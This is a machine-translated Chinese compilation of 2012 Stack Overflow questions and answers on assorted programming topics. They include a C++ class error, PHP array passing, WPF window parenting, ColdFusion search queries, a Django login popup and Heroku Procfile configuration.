我在最后一行收到错误“'atan' 中遇到的循环继承问题”。我很困惑，因为它只出现在该行而不是 main() 中。我只包含在 cpp 文件中，而不包含在其他任何地方。由于错误仅在类函数中，我想我在类中做错了，但无法弄清楚它是什么。

*我只是把主要作为它何时起作用的例子。实际上没有任何目的。

//.h 文件

```
#ifndef CIRCLE_H_
#define CIRCLE_H_

    class Circle {
    public:
        Circle(int minVertex=12);
        ~Circle();
    private:
        int pixels;
    };

#endif /* CIRCLE_H_ */ 
```

// cpp文件

```
#include <circles.h>
#include <cmath>
using namespace std;

int main(){
    double pi = abs(9);
}

Circle::Circle(int minVertex = 12) {
    pixels = 1150;
    double pi = atan(0) *2; // problem here
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:50:12.920

```
class Circle: Circle 
```

你有一个从自身继承的类，这怎么可能？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:50:56.443

```
class Circle: Circle { 
```

你想继承`Circle`自`Circle`吗？

尝试简单

```
class Circle { 
```

# android - 互联网数据库

> ID：10676642
> 
> 赞同：0
> 
> 时间：2012-05-20T19:49:21.167
> 
> 标签：android, database

如何通过 Internet 创建数据库，以便我可以更新数据库，并且所有拥有该应用程序的设备都将获得该更新。我应该像在 php 中那样使用 mySQL 数据库吗？=)

我已经 google'd 和所有这些东西，但找不到一个好的答案。
我希望你知道我的意思！

谢谢！:)

（抱歉英语不好！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:53:57.277

你的问题没有意义。数据库本身并不依赖于互联网。相反，您在机器上有一个数据库，并为其提供一个接口。一种方法是使用基于 REST 的通信机制编写 Rails Web 界面，然后使用 HTTP 请求让您的应用程序与数据库交互。这可能是最常做的事情，并且有很多用于 Rails、PHP 等的库......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:57:52.183

首先，您必须决定要将数据存储在何处。您可以将它们本地存储在设备上或可通过 Internet 访问的服务器上。我假设您希望它们通过 Internet 集中存储，在这种情况下，您可以直接连接到数据库或通过接口连接到数据库。对于我的大部分工作，我通常会在服务器上放置一些脚本来处理 HTTP 请求（我喜欢使用 Web 技术）并连接到该服务器。如果您制作 PHP 或其他脚本，您可以通过发送获取数据或设置数据的请求来调用它。

# php - 将数组作为一个变量从 JavaScript 发送到 PHP

> ID：10676645
> 
> 赞同：2
> 
> 时间：2012-05-20T19:49:30.033
> 
> 标签：php, javascript, jquery, submit, form-submit

我有一个表格，网址是这样的：

```
http://hostname/projectname/classname/methodname/variablename 
```

在我的 JavaScript 中，我填充了一个这样的数组：

```
var currentrelations = new Array();
    $(".ioAddRelation").each(function(index) {
        currentrelations[index] = $(this).html();
    }); 
```

这个数组有两个值`['eeeeee','eeeeee']`

所以网址是：

```
http://localhost/Mar7ba/InformationObject/addIO/eeeeee,eeeeee 
```

在我的 PHP 中，在 InformationObject 类中，在方法 addIO 上：

```
public function addIO($currentRelations =null) {
        $name = $_POST['name'];
        $type = $_POST['type'];
        $concept = $_POST['concept'];
        $contents = $_POST['contents'];
        $this->model->addIO($name, $type, $concept, $contents);
        if (isset($_POST['otherIOs'])) {
            $otherIOs = $_POST['otherIOs'];
            $this->model->addOtherIOs($name, $otherIOs);
        }
        $NumArguments = func_num_args();
        if ($currentRelations!=null) {
            $IOs = $_POST['concetedIOs'];
            $this->model->setIoRelations($name,$IOs, $currentRelations);
        }
        exit;
        include_once 'Successful.php';
        $s = new Successful();
        $s->index("you add the io good");
} 
```

`$currentRelations`但是当我使用这个语句打印数组时：

```
echo count($currentRelations) 
```

结果是`1 not 2`，当我使用 thie 语句打印第一个元素时，`echo $currentRelations[0]`我得到`e not eeeeee`

这是为什么？解决办法是什么？我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T20:18:55.457

正如我评论的那样，它`$currentRalations`是一个字符串，因此`count`在任何不是数组或对象的类型上使用都将返回 1。
另外，请注意，当您`$currentRelations[0]`对字符串执行此操作时，您正在访问从零开始的索引中的字符字符串。由于字符串是字符数组，您可以使用方数组括号来访问字符串中的特定字符。这就是在您的代码中`echo $currentRelations[0];`打印的原因。 要拆分字符串，您应该使用如下函数： `e`

`explode`

```
$curRel = explode(',', $currentRelations); 
```

然后看看你得到了什么

```
var_dump($curRel); 
```

希望能帮助到你。

# javascript - 使用 CSS 在幻灯片中淡化照片

> ID：10676647
> 
> 赞同：0
> 
> 时间：2012-05-20T19:49:48.387
> 
> 标签：javascript, css, animation, slideshow, fading

我有一个网站，主页上有图片幻灯片。在删除照片之前，我会在其后面写下一张照片，然后将其删除。我想知道如何在删除照片之前添加褪色效果。我的网站是：guyzyl.org，所以你可以看看我在说什么。另外我不知道如何使用 Jquery，所以请不要提供该解决方案。谢谢你的帮助。盖伊 Z。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:52:41.523

```
.photo{
    -webkit-transition: opacity .5s ease-in-out;  /*Webkit*/
    -moz-transition: opacity .5s ease-in-out;  /*Firefox*/
    -o-transition: opacity .5s ease-in-out;  /*Opera*/
    transition: opacity .5s ease-in-out;  /*CSS3 Standard*/
    opacity: 1;
}
.photo.fade{
    opacity: 0;
}

document.querySelector(".photo").classList.add("fade"); 
```

见演示：http: [//jsfiddle.net/DerekL/jzLZZ/](http://jsfiddle.net/DerekL/jzLZZ/)

# c# - 将窗口附加到另一个进程的窗口

> ID：10676649
> 
> 赞同：4
> 
> 时间：2012-05-20T19:50:08.503
> 
> 标签：c#, wpf

我的 WPF 应用程序有多个窗口，我想将其中一些窗口附加到另一个进程的窗口。我的问题是，一旦我附加了我的窗口，它就会变得不可见。

我正在尝试使用以下代码：

```
public static bool setParentWindow(IntPtr hWndChild, IntPtr hWndNewParent)
    {
    IntPtr previousParent = SetParent(hWndChild, hWndNewParent);
    return (previousParent == null ? false : true);
}

[DllImport("user32.dll", SetLastError = true)]
private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

setParentWindow(myWindowHwnd, newParentHwnd); 
```

所以，上面的代码成功地附加了窗口，但不幸的是使它不可见。

我这样做的原因是我试图通过为它构建“小部件”来扩展应用程序，我的小部件将挂钩并向用户显示额外的信息。

两个窗口都有以下样式：WS_OVERLAPPEDWINDOW、WS_OVERLAPPED、WS_VISIBLE、WS_CLIPSIBLINGS、WS_CLIPCHILDREN。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-20T23:38:14.550

我发现即使不使用 setParent 调用也可以做到这一点。我使用 HwndSource 类如下：

```
MyWindow window = new MyWindow();
window.ShowActivated = true;

HwndSourceParameters parameters = new HwndSourceParameters();

parameters.WindowStyle = 0x10000000 | 0x40000000;
parameters.SetPosition(0, 0);
parameters.SetSize((int)window.Width, (int)window.Height);
parameters.ParentWindow = newParent;
parameters.UsesPerPixelOpacity = true;
HwndSource src = new HwndSource(parameters);

src.CompositionTarget.BackgroundColor = Colors.Transparent;
src.RootVisual = (Visual)window.Content; 
```

现在效果很好，没有任何问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:21:04.807

我不确定您需要对重叠的窗口做什么，但来自 MSDN：

出于兼容性原因，[**SetParent**](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633541.aspx)不会修改正在更改其父级的窗口的**WS_CHILD**或**WS_POPUP窗口样式。**因此，如果*hWndNewParent*为**NULL** ，您还应该在调用**SetParent**后清除**WS_CHILD**位并设置**WS_POPUP**样式。相反，如果*hWndNewParent*不为**NULL**并且窗口以前是桌面的子窗口，则应在调用**SetParent之前清除****WS_POPUP**样式并设置**WS_CHILD**样式。

 ******** * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-01-04T14:48:25.560

```
private void TryToAttach(IntPtr ownerHandle)
{
    if(ownerHandle == IntPtr.Zero)
    {
        return;
    }
    try
    {
        var helper = new WindowInteropHelper(window) { Owner = ownerHandle };
    }
    catch(Exception e)
    {
        Logger.Error(e, "Could not attach window.");
    }
} 
```*******

# mysql - 如何在 Coldfusion/MySql 中动态进行固定数量的词搜索？

> ID：10676651
> 
> 赞同：0
> 
> 时间：2012-05-20T19:50:22.880
> 
> 标签：mysql, string, search, coldfusion, parameters

我正在尝试升级 Coldfusion8/MySQL 站点。该网站有一个复杂的搜索，（在其他标准中）获取文本字符串并在关键字表中搜索这些。

我不想进行 FULLTEXT 搜索，因为完整的查询有很多额外的条件。我正在寻找的是使以下内容更加**“动态”**，而不是将自己限制在 xy 单词中，从而可能会缩短一点（完整的搜索有很多这样的块）。

所以，假设我有一个搜索字符串

```
I'm looking for something 
```

我目前正在这样做：

```
<!--- params --->
<cfparam name="s01" default="">
<cfparam name="s02" default="">
<cfparam name="s03" default="">    
<cfparam name="s04" default="">
<cfparam name="s05" default="">

<!--- get length of search string --->
<cfset howManyWords = ListLen(textSearch," ")>

<!--- assign words to params --->
<cfif howManyWords gt 0><cfset s01 = trim(ListGetAt(textSearch, 1," "))></cfif>
<cfif howManyWords gt 1><cfset s02 = trim(ListGetAt(textSearch, 2," "))></cfif>
<cfif howManyWords gt 2><cfset s03 = trim(ListGetAt(textSearch, 3," "))></cfif>
<cfif howManyWords gt 3><cfset s04 = trim(ListGetAt(textSearch, 4," "))></cfif>
<cfif howManyWords gt 4><cfset s05 = trim(ListGetAt(textSearch, 5," "))></cfif> 
```

在我的**搜索查询**中，我将搜索字符串与三个数据库字段匹配：

```
...
<cfif textSearch neq "">
    <cfif s01 neq "">AND (a.textSearch LIKE "%#s01#%" OR a.textSearch_xl LIKE "%#s01#%" OR a.ean = "#s01#")</cfif>
    <cfif s02 neq "">AND (a.textSearch LIKE "%#s02#%" OR a.textSearch_xl LIKE "%#s02#%" OR a.ean = "#s02#")</cfif>
    <cfif s03 neq "">AND (a.textSearch LIKE "%#s03#%" OR a.textSearch_xl LIKE "%#s03#%" OR a.ean = "#s03#")</cfif>
    <cfif s04 neq "">AND (a.textSearch LIKE "%#s04#%" OR a.textSearch_xl LIKE "%#s04#%" OR a.ean = "#s04#")</cfif>
    <cfif s05 neq "">AND (a.textSearch LIKE "%#s05#%" OR a.textSearch_xl LIKE "%#s05#%" OR a.ean = "#s05#")</cfif>
</cfif>
... 
```

**问题：**
有没有办法让这更加动态，例如使用循环，所以我不会被 5 个单词困住？在这种情况下，我将如何预设*参数*值？

感谢帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T20:11:12.463

您可以通过在查询中将其作为列表循环来扩展搜索词，您还应该使用查询参数来防止 SQL 注入攻击。

```
<cfloop list="#textSearch#" index="word" delimiters=" ">
  AND (
    a.textSearch LIKE <cfqueryparam cfsqltype="cfsql_varchar" value="%#word#%"> 
    OR a.textSearch_xl LIKE <cfqueryparam cfsqltype="cfsql_varchar" value="%#word#%">  
    OR a.ean = <cfqueryparam cfsqltype="cfsql_varchar" value="#word#"> 
  )
</cfloop> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T20:14:20.490

您可以使用交替构建一个简单的正则表达式，然后使用 MySQL 的[`REGEXP`](http://dev.mysql.com/doc/refman/5.5/en/regexp.html#operator_regexp)运算符。你会在 SQL 中想要这样的东西：

```
and (a.textSearch regexp 'a|b|c|...' or a.textSearch_xl regexp 'a|b|c|...' or a.ean regexp 'a|b|c|...') 
```

其中`a`, `b`, `c`, ... 是您要搜索的内容。虽然我不知道 ColdFushion 方面的事情，但构建正则表达式应该相当简单。

# django - 从 Django View 向 jQuery 传递参数并使用基于 if else 条件的回调函数

> ID：10676652
> 
> 赞同：0
> 
> 时间：2012-05-20T19:50:31.743
> 
> 标签：django, jquery, django-forms, django-views

我的 base.html 中有一个弹出式登录表单

```
<div id="login-box" class="login-popup">
    <a href="#" class="close"><img src="http://localhost:8000/static/media/close_pop.png" class="btn_close" title="Close Window" alt="Close" /></a>
      <form method="post" class="signin" action="{% url login_view %}" id="LoginForm">
          <div id="ajaxwrapper">
            <fieldset class="textbox">
            <label class="username">
            <span>Username</span>
            <input id="username" name="username" value="" type="text" autocomplete="on" placeholder="Username">
            </label>
            <label class="password">
            <span>Password</span>
            <input id="password" name="password" value="" type="password" placeholder="Password">
            </label>
            <p id="sendwrapper"></p>
            <p><button id="submitbutton" type="submit">Sign in</button></p>
            <p>
            <a class="forgot" href="/accounts/password/reset/">Forgot your password?</a>
            </p>       
            </fieldset>
          </div>
      </form> 
```

提交时，此表单在 Django 视图中调用以下函数：

```
def login_view(request):
if request.method == 'POST':
    form = LoginForm(request.POST)
    if form.is_valid():
        print "%s" % repr(request.POST) 
        print "%s" % repr(request.GET) 
        cd = form.cleaned_data
        user = authenticate(username=cd['username'], password=cd['password'])
        print user
        if user is not None:
            if user.is_active:
               login(request, user)
               # success
               response_dict = 'success' 
               return render_to_response("tr/login.html", { 'username' : user , 'response_dict' : response_dict })
            else:
               # disabled account
               response_dict = 'The account is disabled'
               return render_to_response("tr/login.html", { 'response_dict' : response_dict })
        else:
           # invalid login
           response_dict = 'Username or Password is not correct'
           return render_to_response("tr/login.html", { 'response_dict' : response_dict })
    else:
        print "%s" % repr(form.errors) 
```

现在我想为每次不成功的尝试保留弹出登录框，并在成功尝试时关闭它。为此，我正在尝试下面的 jQuery 代码。但我不知道如何处理它。

```
jQuery(function() {
  var form = jQuery("#LoginForm");
  form.submit(function(e) {
      var a = 1;
      jQuery("#submitbutton").attr('disabled', true)
      jQuery("#sendwrapper").prepend('<span>Sending message, please wait... </span>')
      if(a==1){jQuery("#ajaxwrapper").load(
          form.attr('action') + ' #ajaxwrapper',
          form.serializeArray(),
          function(responseText, responseStatus) {
              jQuery("#sendwrapper").html('<span> AAAAAAAAAAAAAAA </span>')    
              jQuery("#sendbutton").attr('disabled', false)
          }
      )}
      else{jQuery("#ajaxwrapper").load(
          form.attr('action') + ' #ajaxwrapper',
          form.serializeArray(),
          function(responseText, responseStatus) {
              jQuery("#sendwrapper").html('<span> AAAAAAAAAAAAAAA </span>')    
              jQuery("#sendbutton").attr('disabled', false)
          }
      )};
      e.preventDefault(); 
  });
 }); 
```

请帮忙！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T22:49:38.990

在您的 login_view 中，向模板返回“成功”。如果登录成功，则success=True，否则success=False。

在您的模板中，您可以检查是否成功 == True，关闭弹出窗口。

顺便说一句，你的变量有点令人困惑。我建议做这样的事情：

```
response_dict['message'] = 'Login successful.' 
response_dict['success'] = True
response_dict['user'] = user
return render_to_response("tr/login.html", response_dict) 
```

如果您这样做，您也不需要将用户传递给模板：[https ://docs.djangoproject.com/en/dev/topics/auth/#authentication-data-in-templates](https://docs.djangoproject.com/en/dev/topics/auth/#authentication-data-in-templates)

# php - 复制 PHP 行

> ID：10676653
> 
> 赞同：0
> 
> 时间：2012-05-20T19:50:34.543
> 
> 标签：php, scripting

我有一个问题，首先，我有一个变量 $num_newlines 可以更改文件的行数。然后我想要做的是将一行复制到比 $num_newlines 等于少一。该行是：

```
$tweetcpitems->post('statuses/update', array('status' => wordFilter("The item $array[1] has been released on Club Penguin."))); 
```

我接下来要做的是，对于每个重复的行，我希望更改数组编号，例如：

```
$tweetcpitems->post('statuses/update', array('status' => wordFilter("The item *$array[1]* has been released on Club Penguin."))); 
```

然后第二行是这样的：

```
$tweetcpitems->post('statuses/update', array('status' => wordFilter("The item *$array[2]* has been released on Club Penguin."))); 
```

然后第三行有 $array[3] 等等。主要问题是我不想手动添加代码行并更改数字，因为变量 $num_newlines 总是在变化。任何帮助将**不胜**感激，因为我一直在研究如何做到这一点，但一无所获。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:54:06.217

```
for ($i=0; $i<($numlines - 1); $i++) {
    $tweetcpitems->post('statuses/update', array('status' => wordFilter("The item $array[$i] has been released on Club Penguin.")));
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T20:00:50.223

使用 for 循环

```
for($i=1,$i<=$lines,$i++)
{
// ............'status' => wordFilter("The item $array[$i] has been released on Club Penguin.")));
} 
```

# asp.net - ASP.Net MasterPage 的全局变量

> ID：10676654
> 
> 赞同：2
> 
> 时间：2012-05-20T19:50:37.823
> 
> 标签：asp.net, global-variables, master-pages

我正在将 web 应用程序从框架集布局转换为母版页布局。框架集中的每个页面都使用一个通用的自定义类来获取登录用户，这个自定义类继承自 Page。

我认为接口将是转换它的正确方法，但我真的错了。存储全局变量或类以便 Masterpage 的每个内容页面都可以引用登录的用户类的最佳和最有效的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T21:00:07.183

使其成为一个简单的静态类，使用静态方法返回登录的用户类，无需将此代码与 ASP.NET 页面绑定。如果获取登录用户需要一些时间，那么昂贵的操作（例如数据库查询）将登录的用户类实例存储在会话中。像这样的东西：

```
public static class Users
{

  public static User GetLoggedUser()
  {
    if (HttpContext.Current.Session["LoggedUser"] != null)
    {
      return (User)HttpContext.Current.Session["LoggedUser"];
    }
    else
    {
      User usr = GetLoggedUserSomehow(); // here goes your current code to get user
      HttpContext.Current.Session["LoggedUser"] = usr;
      return usr;
    }
  }

} 
```

# caching - 如何为静态网页刷新 Amazon S3 存储的缓存？

> ID：10676656
> 
> 赞同：9
> 
> 时间：2012-05-20T19:50:54.883
> 
> 标签：caching, amazon-s3, amazon-web-services, amazon

我正在搜索亚马逊支持论坛并找到了一个线程 - [https://forums.aws.amazon.com/thread.jspa?messageID=346895䬏](https://forums.aws.amazon.com/thread.jspa?messageID=346895&#346895) - 有相同的未回答问题......

CMD + SHIFT + DELETE：clearBrowserData（从时间开始）

CMD + R：刷新

# 没有效果

[http://www.example.com.s3-website-eu-west-1.amazonaws.com/yoga/Home.html](http://www.example.com.s3-website-eu-west-1.amazonaws.com/yoga/Home.html) -**工作**[http://www.example.com/yoga/Home.html](http://www.example.com/yoga/Home.html) -**该死**

 **有什么方法可以强制刷新托管在 Amazon S3 上的网页？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-21T19:28:09.513

我知道这很愚蠢，但至少更改会立即生效:)

![即时更改](../Images/15991f6f5bcc899a852d052e8952f1c9.png)**

# jquery - jquery向下钻取

> ID：10676659
> 
> 赞同：1
> 
> 时间：2012-05-20T19:51:03.123
> 
> 标签：jquery

当检查复选框时，我正在尝试更改一个按钮的类，但我无法搞定正确。选中复选框后，我想将按钮类从按钮隐藏更改为按钮显示。

HTML

```
<div class="checkbox">
    <input id="ChartstoDisplayAll" type="checkbox"     name="ctl00$MainContent$ChartstoDisplayAll" /><label for="ChartstoDisplayAll">Select All</label>
    <p class="checkbox" style="margin-left:5px;"> or select individually below </p>
    <hr class="horizline" style="width:870px;"/>
</div>

    <div id="buttons" class="buttonshide">
        <input type="image" name="ctl00$MainContent$btnGetChart"  id="MainContent_btnGetChart" title="Click here to retrieve the charts" Text="Build the  Charts" src="Styles/Images/stats.png" alt="Build the Charts" align="left" />
        <p style="font-size:.8em; font-weight:bold;">Build Charts</p>
    </div> 
```

仅供参考...这两个 div 之间还有其他 html。为了简洁起见，我把它拿出来，因为没有一个按钮的 id。

这是javascript。（我尝试过的最新方法）

```
 //this script will change the style of the "Select All" checkbox and make visible the "Build Chart" button
  $(document).ready(function () {
      $('#ChartstoDisplayAll').click(
          function () {
              $("INPUT[type='checkbox']").attr('checked', $('#ChartstoDisplayAll').is(':checked'));
              $(this).next().toggleClass("selected");
              $(this).find("buttons").toggleclass("buttonsshow");
          });
  }); 
```

​这里是小提琴链接 [http://jsfiddle.net/dinotom/h25tM/2/](http://jsfiddle.net/dinotom/h25tM/2/)

这是完成的工作脚本，它更改文本颜色并在选中复选框时显示按钮。

```
 //this script will change the style of the "Select All" checkbox and make visible the "Build Chart" button
  $(document).ready(function () {
      $('#ChartstoDisplayAll').change(
          function () {
              if ($('#ChartstoDisplayAll').is(':checked')) {
                  $(this).next().addClass("selected");
                  $('#buttons').addClass("buttonsshow").removeClass('buttonshide');
              } else {
                  $('#buttons').addClass("buttonshide").removeClass('buttonsshow');
                  $(this).next().removeClass("selected");
              }
          });
  }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:00:20.800

试试这个：

```
if ($('#ChartstoDisplayAll').is(':checked')) {
  $(this).find("buttons").addClass("buttonsshow").removeClass('buttonshide');
} else {
  $(this).find("buttons").addClass("buttonshide").removeClass('buttonsshow');
} 
```

此外，您应该使用[更改](http://api.jquery.com/change/)事件而不是[单击](http://api.jquery.com/click/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:29:35.950

基本上这应该有帮助：

## *[jsFiddle 演示](http://jsfiddle.net/vVqhW/1/)*

```
$('#ChartstoDisplayAll').on('change', function() {
    $(this).next('label').toggleClass("selected");      
    $("input[type='image']").toggleClass("buttonsshow");      
}); 
```

顺便说一句：我更改了您的 CSS 并添加了一些注释，请查看演示

# scala - Play 2.0 Scala Heroku 实例没有看到 Procfile 中的每个变量

> ID：10676667
> 
> 赞同：0
> 
> 时间：2012-05-20T19:52:00.570
> 
> 标签：scala, heroku, playframework, cedar

我正在使用播放！Heroku 上的 2.0 Scala 版本。Heroku 似乎没有看到/使用我在 Procfile 中的所有配置变量。

例如，在我的 application.conf 中，我有以下变量（其中包括）：

```
mongodb.default.db = "nyancat"
mongodb.default.host = "localhost"
mongodb.default.port = 27017 
```

这些应该是本地开发的默认设置。但是，我希望我的 Heroku 实例使用 MongoLabs 实例。（不幸的是，Salat 没有配置 URI，所以我不得不将其分解为主机、端口、yada yada，即未使用 MONGOLAB_URI）

我的 Procfile 现在看起来像这样：

```
☆  cat Procfile                                             
web: target/start -Dsecurehostname="https://example.org" \
-Dhostname="http://example.org" -Dhttp.port=$PORT \
-DapplyEvolutions.default=true -Ddb.default.driver=org.postgresql.Driver \
-Ddb.default.url=$DATABASE_URL -Dredis=$REDISTOGO_URL \
-Dmailgun.apikey=$MAILGUN_API_KEY -Dmongodb.default.db="heroku_appXXXXXXX" \
-Dmongodb.default.host="dsXXXXXX.mongolab.com" -Dmongodb.default.port=XXXXX \
-Dmongodb.default.user="heroku_appXXXXXXX" \
-Dmongodb.default.password="foobared_not" 
```

我推送并重新启动，但远程 MongoDB 连接仍然说它连接到 localhost:27017

Redis 和其他一切都工作得很好而且花花公子。

远程日志在启动时显示了这一点，并且它显然不包含我的 Procfile 中的所有参数：

```
2012-05-20T19:35:18+00:00 heroku[web.1]: Starting process with command \
`target/start -Dhostname="https://example.org" -Dhttp.port=XXXXX \
-DapplyEvolutions.default=true -Ddb.default.driver=org.postgresql.Driver \
-Ddb.default.url=<HIDDEN> -Dredis=<HIDDEN> -Dmailgun.apikey=<HIDDEN>` 
```

即`mongo.*`日志中没有任何参数。

如果我遗漏了什么，请告诉我，谢谢各位。

* * *

**更新**

我尝试在本地模拟 Heroku，使用`sbt stage`并运行带有`foreman start`. *我*设置了 Heroku 设置的环境变量，并像这样运行它：

```
app git:(master) ☆  DATABASE_URL="jdbc:h2:mem:mydatabase;MODE=PostgreSQL" \
  REDISTOGO_URL="redis://ignored:foobared@localhost:6379/" \
  foreman start
20:20:27 web.1     | started with pid 43382
20:20:27 web.1     | Play server process ID is 43382
20:20:29 web.1     | [info] play - database [default] connected at jdbc:h2:mem:mydatabase
20:20:29 web.1     | [info] play - mongodb [default] connected at "heroku_appXXXXXXX"@"dsXXXXXX.mongolab.com":XXXXX/"heroku_appXXXXXXX"
20:20:30 web.1     | [info] play - Application started (Prod)
20:20:30 web.1     | [info] play - Listening for HTTP on port 5000... 
```

foreman 获取我在 Procfile 中的 PRODUCTION MongoDB 值，这验证了我的论点，即 Heroku 可能出于某种未知原因使用了我的 Procfile 的旧版本。

在我的 Heroku 实例上，Procfile 也绝对没有设置不可变标志：

```
~ $ lsattr Procfile
------------------- Procfile 
```

* * *

**更新 2**

我正在[为 Play Framework 2 (Scala only) 使用 MongoDB Salat 插件](https://github.com/leon/play-salat)。

这是我挑选的一个模式：

在我开始实施 MongoDB 支持之前，每次推送都**成功了。**

然后我集成了[Salat 插件](https://github.com/leon/play-salat)，注册了一个 MongoLabs 帐户，乐趣就开始了。上面的插件不支持[com.mongodb.MongoURI](http://api.mongodb.org/java/2.7.2/com/mongodb/MongoURI.html)并且由于它解析配置的方式，如果你给它它会爆炸`-Dmongodb.uri`。它需要一个键空间，例如“默认”。

这让我们回到了`mongodb.default.*`我上面一直使用的开关。

现在我的开发周期是这样的：

```
push, fail
push (without changes), success, but seemingly with old Procfile
<make change>
push, fail
push (without changes), success, but seemingly with old Procfile
<make change>
push, fail
push (without changes), success, but seemingly with old Procfile
... 
```

最烦人的是，失败的推送只是记录了这一点：

```
Heroku push rejected due to an unrecognized error. 
```

...并且`heroku logs -t`输出仅显示以下内容：

```
2012-05-22T07:23:59+00:00 heroku[slugc]: Slug compilation failed: unrecognized error 
```

它在本地工作，顺便说一句。

我把这一切都带来了 Heroku 支持的关注，因为它们可能会吞下[Typesafe 的 Config](https://github.com/typesafehub/config)抛出的错误，而它可以从一开始就让事情变得更清晰。

我还要求他们不要让第二次推送成功，而是使用旧的 Procfile。非常误导。

不用说，我现在也在为 Salat 插件实现 MongoURI 支持。

* * *

**更新 3**

[我已经](https://github.com/leon/play-salat/pull/8)`mongodb.default.uri`在 Play 中实现了对的支持！Salat 插件（并使用 lib/ 部署它），但是每当我在我的 Procfile 中推送任何与 mongo 相关的内容时，Heroku 仍然会引发错误。

我问 Heroku 是否支持同样的问题，也许这里有人可以回答：Heroku 是否限制了您可以在 Procfile 中使用的变量？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-24T22:28:19.367

请注意，Procfile 的启动命令最多可以有**255 个字符**。我希望您所有的 mongodb 配置都超出此范围。

我建议您参考一个[替代配置文件](http://www.playframework.org/documentation/2.0/ProductionConfiguration)。对于您的非[环境变量](https://devcenter.heroku.com/articles/config-vars)相关配置，例如：

```
web: target/start -Dhttp.port=$PORT -Ddb.default.url=$DATABASE_URL \
-Dredis=$REDISTOGO_URL -Dmailgun.apikey=$MAILGUN_API_KEY \
-Dconfig.resource=heroku-prod.conf 
```

在 conf/heroku-prod.conf 中：

```
include "application.conf"                                        

securehostname="https://example.org" 
hostname="http://example.org" 
applyEvolutions.default=true
db.default.driver=org.postgresql.Driver 
mongodb.default.db="heroku_appXXXXXXX"
mongodb.default.host="dsXXXXXX.mongolab.com"
mongodb.default.port=XXXXX \
mongodb.default.user="heroku_appXXXXXXX"
mongodb.default.password="foobared_not" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T21:24:08.817

也许插件启用了一些变量？我没有检查heroku api，但这可能是一个线索。

第二点是您如何访问这些变量，我的猜测是类型安全配置系统不会回退到命令行选项。

最后一点是根据[https://github.com/playframework/Play20/blob/master/framework/src/play/src/main/scala/play/api/Configuration.scala](https://github.com/playframework/Play20/blob/master/framework/src/play/src/main/scala/play/api/Configuration.scala)可以在application.conf中添加classpath 的根目录，它将在生产模式下使用，而不是从 conf/ 显式检索它。

我的2c

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T11:58:43.263

您也可以尝试在 application.conf 中进行这样的配置 ....

我不确定这个heroku、生产模式还是其他什么，但我注意到使用“heroku config”设置的环境变量也有些奇怪。

在 application.conf 中，如果使用符号

```
google.client=$(GOOGCLIENTID) 
```

在本地工作站上运行似乎一切正常。我可以使用“heroku config”验证变量是否已设置，但在 heroku 上运行时，它显然不会传播到配置中。

但是，这种表示法可以正常工作：

```
google.client=$(?GOOGCLIENTID) 
```

希望能帮助到你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T17:02:14.450

$MAILGUN_API_KEY 中有什么有趣的字符吗？尝试将 -Dmailgun.apikey=$MAILGUN_API_KEY 移动到最后...

# printing - Coldfusion查询转换为msword

> ID：10676673
> 
> 赞同：0
> 
> 时间：2012-05-20T19:53:06.333
> 
> 标签：printing, coldfusion, ms-word, save

我正在尝试过去两周使用 Coldfusion 将查询数据转换为 ms word doc。我发现的唯一方法是：

```
<cfcontent type="application/msword">
    <cfquery name="getArtist" datasource="cfartgallery">
    SELECT *
    FROM Artists
    </cfquery>

    <cfdump var=#getArtist#> 
```

以上是在 doc 中转换查询（您可以将其作为 doc 打开），但是如果您跳过打开文件并直接将其保存，则可以将其保存为“.cfm”的唯一方法。这不是我需要的。我正在尝试构建一个应用程序，用户可以下载 ms word 文件中的文章。Pdf 不是一个选项。

提前谢谢你，一切都好，

汤姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-22T05:16:00.323

使用 cfdocument 将其输出为 pdf。这应该可以正常工作，并且可以在 MS Word 或其他地方轻松打开。

```
<cfdocument 
    format="pdf" 
    filename = "pdfpath\pdffile.pdf"
    overwrite = "yes"
    marginBottom = ".2"
    marginLeft = ".4"
    marginRight = ".4"
    marginTop = ".2">

    Blah blah stuff here...

</cfdocument> 
```

**编辑：**对不起，我错过了你的注意，PDF 不是一个选项。

# oop - 简单的域对象属性值

> ID：10676675
> 
> 赞同：1
> 
> 时间：2012-05-20T19:53:28.470
> 
> 标签：oop, dns, domain-driven-design, ooad

假设您有一个 Song 的域模型类。歌曲有一个速度属性（一个 int），它应该总是一个正数。这个需求应该是领域模型的一部分还是外部的（例如在 SongManager / 业务逻辑层类中）？

假设您选择这样实现它：

```
class Song {
  private int tempo;
  // ...

  public void setTempo(int tempo) {
    if (tempo > 0) {
      this.tempo = tempo;
    } else {
      // what?
    }

  }

} 
```

您是否将`// what?`上面替换为：

1.  没有。给定一个 Song 实例`s`，`s.setTempo(-10)`根本不会修改对象的状态。
2.  将速度设置为某个最小值，例如`1`.
